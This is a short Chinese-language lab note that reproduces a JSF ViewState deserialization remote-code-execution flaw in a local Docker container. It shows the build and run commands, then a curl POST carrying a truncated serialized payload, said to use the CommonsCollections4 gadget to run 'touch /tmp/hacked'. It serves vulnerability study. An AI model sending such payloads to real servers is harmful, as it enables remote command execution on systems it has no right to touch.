环境搭建
```
docker build -t jsf-viewstate-default-rce .
docker run -d -p 9090:8080 jsf-viewstate-default-rce
```
![](./img/99af1643f2f1438f84771f10249fa3dc.png)

漏洞复现
```
// 容器内执行命令
docker exec -it <container> ls /tmp/

// 参数: CommonsCollections4 "touch /tmp/hacked"
curl -X POST "http://127.0.0.1:9090/jsf/calc.xhtml" -d "javax.faces.ViewState=H4sIAAAAAAAAA..."
```

![](./img/4b72a4ffb3964bf9b1557007b2dcf62c.png)



